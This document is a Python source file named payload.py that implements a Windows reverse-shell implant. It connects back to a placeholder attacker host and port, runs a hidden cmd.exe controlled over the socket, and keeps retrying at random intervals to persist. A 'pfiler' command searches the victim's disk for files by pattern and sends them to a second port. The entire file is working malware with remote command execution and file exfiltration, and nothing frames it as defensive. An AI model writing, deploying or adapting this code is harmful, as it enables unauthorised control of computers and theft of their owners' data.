# payload.py
# The Heartbeat Soul, reborn with the power of unbreakable protocol.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
# --------------------

FILE_PORT = RPORT + 1
CHUNK_SIZE = 1024 * 1024 # 1MB chunks

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha.update(block)
        return sha.hexdigest()
    except:
        return None

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    # If no path is specified in the command, use the current directory
    if not os.path.isdir(start_path):
        patterns = [start_path] + patterns
        start_path = "."

    for root, _, files in os.walk(os.path.abspath(start_path)):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return list(set(found_files)) # Return unique files

def transfer_file(file_path):
    """Connects to the dedicated FILE_PORT and transfers a single file."""
    try:
        s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_file.connect((RHOST, FILE_PORT))

        # 1. Send file name
        file_name = os.path.basename(file_path)
        s_file.send(file_name.encode())
        s_file.recv(2) # Wait for OK

        # 2. Send file size
        file_size = os.path.getsize(file_path)
        s_file.send(str(file_size).encode())
        s_file.recv(2) # Wait for OK

        # 3. Send file in chunks
        with open(file_path, "rb") as f:
            while True:
                data = f.read(CHUNK_SIZE)
                if not data:
                    break
                s_file.sendall(data)
        
        # 4. Send checksum
        checksum = calculate_sha256(file_path)
        if checksum:
            s_file.send(checksum.encode())

    except Exception:
        # Fail silently if a single file transfer fails
        pass
    finally:
        s_file.close()

def handle_pfiler_command(command):
    """Parses pfiler command, finds files, and transfers them on a new connection."""
    parts = command.strip().split()
    if len(parts) < 2:
        return # No pattern specified
    
    # pfiler path\to\search *.txt *.docx
    # pfiler *.log
    path_or_pattern = parts[1]
    patterns = parts[2:]

    files_to_send = find_files(path_or_pattern, patterns)
    
    for f in files_to_send:
        # For each file, create a new thread to transfer it.
        # This prevents a single large file from blocking others.
        t = threading.Thread(target=transfer_file, args=(f,), daemon=True)
        t.start()

def run_conduit():
    """Main reverse shell loop."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000,
                cwd=os.getcwd()
            )
            
            stop_event = threading.Event()

            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data:
                            sock.sendall(data)
                        else:
                            break
                    except:
                        break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()

                    if command_str.lower().startswith('pfiler '):
                        # The command must not go to cmd.exe. Handle it here.
                        # Run in a separate thread to avoid blocking the shell.
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str,), daemon=True)
                        pfiler_thread.start()
                    else:
                        # Pass all other commands to cmd.exe
                        if command_str.lower().startswith('cd '):
                            try:
                                target_dir = command_str.split(' ', 1)[1].strip()
                                os.chdir(target_dir)
                                p.stdin.write(data)
                                p.stdin.flush()
                                # Send current dir back to listener for prompt
                                p.stdin.write(b'cd\r\n')
                                p.stdin.flush()
                            except:
                                p.stdin.write(data)
                                p.stdin.flush()
                        else:
                            p.stdin.write(data)
                            p.stdin.flush()

                except:
                    break
            
            stop_event.set()
            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()